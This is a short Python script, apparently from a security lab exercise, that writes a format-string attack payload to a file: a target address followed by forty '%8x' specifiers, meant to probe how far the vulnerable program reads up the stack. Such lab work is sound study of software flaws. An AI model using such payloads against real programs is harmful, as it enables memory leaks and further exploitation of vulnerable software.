#!/usr/bin/python3
# task2_0: test the length of vaList to the payload

# target address + %x*40 + \n
payload = "\x04\xcf\xff\xff"+"val:"+ ".%8x"*40 + "\n"

payload = payload.encode('latin-1')
with open('input', 'wb') as f:
  f.write(payload)